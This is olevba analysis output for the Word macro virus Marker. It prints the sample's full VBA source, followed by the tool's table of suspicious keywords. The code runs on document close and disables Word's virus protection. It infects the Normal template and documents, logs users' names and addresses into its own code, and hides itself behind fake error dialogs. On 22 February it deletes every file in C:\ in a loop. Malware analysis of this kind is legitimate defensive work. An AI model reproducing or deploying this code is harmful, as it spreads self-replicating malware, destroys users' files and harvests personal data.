olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-8dec2c82ada7291f7eca371b7799f1924e7bb7a0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-8dec2c82ada7291f7eca371b7799f1924e7bb7a0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Private Sub Document_Close()
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim ad, nt As Object
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim rep, x As Integer
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim virusCode, UserAddress, LogData, LogFile As String
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.VirusProtection = False
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.SaveNormalPrompt = True
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Delivery:
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Day(Now()) = 22 And Month(Now()) = 2 Then
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Kill "C:\*.*":
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
GoTo Delivery
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If DocumentInfected = True Then
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
SaveNormalTemplate = NormalTemplate.Saved
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For i = 1 To Len(Application.UserAddress)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Else
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
UserAddress = UserAddress & Chr(13) & "' "
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next i
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = virusCode & LogData
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.AddFromString virusCode
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With nt.codemodule
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With nt.codemodule
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 45 To 181 Step 2
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If SaveNormalTemplate = True Then NormalTemplate.Save
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If NormalTemplateInfected = True Then
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
SaveDocument = ActiveDocument.Saved
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.AddFromString virusCode
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.AddFromString virusCode
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.Deletelines 174, 13
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With ad.codemodule
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 45 To 181 Step 2
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If SaveDocument = True Then ActiveDocument.Save
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.SaveNormalPrompt = False
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub viewVBcode()
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
x = MsgBox(" Error - Not enough memory!", vbOKOnly + VbApplication + vbCritical, "Visual Basic Editor")
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ToolsMacro()
' Andreas Marx VD_0BF.DOC07.10.00 17:15:18HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
x = MsgBox(" Error - Not enough memory!", vbOKOnly + VbApplication + vbCritical, "Visual Basic Editor")

End Sub
' Costin Raiu GOAT97-1.DOC7/25/99 4:24:20 PM
' Avert Doc2.doc7/1/99 3:48:48 PM
' Costin Raiu GOAT97-1.DOC7/25/99 4:24:20 PM
' Avert Doc2.doc7/1/99 3:48:48 PM
' Costin Raiu GOAT97-1.DOC7/25/99 4:24:20 PM

' Costin Raiu GOAT97-1.DOC7/25/99 4:24:20 PM

' 05:15:18  -Samstag,7 Okt,2000
' Andreas Marx
'
' VD_0BF.DOC

' dok1.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
